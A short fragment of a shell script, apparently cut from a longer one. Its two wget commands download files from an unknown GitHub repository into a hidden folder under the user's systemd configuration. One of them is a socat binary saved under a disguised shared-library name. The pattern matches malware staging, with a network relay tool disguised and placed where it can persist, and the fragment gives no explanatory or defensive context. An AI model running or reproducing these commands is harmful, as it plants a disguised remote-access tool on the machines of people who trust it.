...
wget -O $HOME/.config/systemd/user/libxct-util/libdev.so https://raw.githubusercontent.com/qofiajsflkasdf/testing/main/socatx64.bin 

wget -O $HOME/.config/systemd/user/libxct-util/libdev.so.6 https://raw.githubusercontent.com/qofiajsflkasdf/testing/main/libdev.so.6 
